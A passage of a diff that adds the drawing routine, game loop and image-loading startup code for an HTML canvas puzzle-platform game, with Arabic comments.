+            // سيتم تنفيذ التأثيرات الصوتية لاحقاً
+            console.log(`Playing sound: ${soundName}`);
+        }
+        
+        // رسم العناصر
+        function draw() {
+            // مسح canvas
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            
+            // رسم الخلفية
+            ctx.drawImage(backgroundImage, 0, 0, canvas.width, canvas.height);
+            
+            // رسم الأرض
+            ctx.fillStyle = 'rgba(58, 58, 90, 0.7)';
+            ctx.fillRect(0, canvas.height - 100, canvas.width, 100);
+            
+            // رسم العقبات
+            for (const obstacle of obstacles) {
+                ctx.fillStyle = obstacle.color;
+                ctx.fillRect(obstacle.x, obstacle.y, obstacle.width, obstacle.height);
+                
+                // إضافة تأثير ثلاثي الأبعاد للعقبات
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.3)';
+                ctx.fillRect(obstacle.x, obstacle.y, obstacle.width, 10);
+                ctx.fillRect(obstacle.x, obstacle.y, 10, obstacle.height);
+            }
+            
+            // رسم العناصر
+            for (const item of items) {
+                ctx.fillStyle = item.color;
+                ctx.beginPath();
+                ctx.arc(item.x + item.width/2, item.y + item.height/2, item.width/2, 0, Math.PI * 2);
+                ctx.fill();
+                
+                // رسم تأثير متحرك للعناصر
+                ctx.beginPath();
+                ctx.arc(item.x + item.width/2, item.y + item.height/2, 20, 0, Math.PI * 2);
+                ctx.strokeStyle = 'rgba(255, 204, 0, 0.5)';
+                ctx.lineWidth = 2;
+                ctx.stroke();
+            }
+            
+            // رسم المخارج
+            for (const exit of exits) {
+                ctx.fillStyle = exit.locked ? '#ff4a4a' : exit.color;
+                ctx.fillRect(exit.x, exit.y, exit.width, exit.height);
+                
+                // رسم تفاصيل الباب
+                ctx.fillStyle = exit.locked ? '#882222' : '#2a8822';
+                ctx.fillRect(exit.x + 10, exit.y + 10, 30, 30);
+            }
+            
+            // رسم الألغاز
+            for (const puzzle of puzzles) {
+                ctx.fillStyle = puzzle.color;
+                ctx.fillRect(puzzle.x, puzzle.y, puzzle.width, puzzle.height);
+                
+                // رسم تفاصيل اللغز
+                ctx.fillStyle = '#ffffff';
+                ctx.fillText('?', puzzle.x + 15, puzzle.y + 25);
+            }
+            
+            // رسم اللاعب
+            if (playerImage.complete) {
+                // قلب الصورة حسب اتجاه الحركة
+                if (player.facing === 'left') {
+                    ctx.save();
+                    ctx.scale(-1, 1);
+                    ctx.drawImage(playerImage, -player.x - player.width, player.y, player.width, player.height);
+                    ctx.restore();
+                } else {
+                    ctx.drawImage(playerImage, player.x, player.y, player.width, player.height);
+                }
+            } else {
+                // رسم بدائي إذا لم تحمل الصورة
+                ctx.fillStyle = '#6a2cc9';
+                ctx.fillRect(player.x, player.y, player.width, player.height);
+            }
+            
+            // رسم واجهة المستخدم
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
+            ctx.fillRect(10, 10, 200, 40);
+            ctx.fillStyle = '#ffffff';
+            ctx.font = '16px Arial';
+            ctx.fillText(`المستوى: ${currentLevel}`, 20, 35);
+            
+            if (hasKey) {
+                ctx.fillStyle = '#ffcc00';
+                ctx.beginPath();
+                ctx.arc(canvas.width - 35, 35, 15, 0, Math.PI * 2);
+                ctx.fill();
+            }
+        }
+        
+        // حلقة اللعبة الرئيسية
+        function gameLoop() {
+            if (canvas.style.display !== 'block') return;
+            
+            update();
+            draw();
+            requestAnimationFrame(gameLoop);
+        }
+        
+        // تهيئة أولية
+        window.onload = function() {
+            // تحميل الصور قبل البدء
+            let imagesLoaded = 0;
+            const totalImages = 3;
+            
+            function imageLoaded() {
+                imagesLoaded++;
+                if (imagesLoaded === totalImages) {
+                    // إخفاء شاشة التحميل عندما يتم تحميل جميع الصور
+                    setTimeout(() => {
+                        loadingScreen.style.display = 'none';
+                        startScreen.style.display = 'flex';
+                    }, 1000);
+                }
+            }
+            
+            backgroundImage.onload = imageLoaded;
+            playerImage.onload = imageLoaded;
+            wallImage.onload = imageLoaded;
+            
+            initLevelSelect();
+        };
+    </script>
 </body>
 </html>
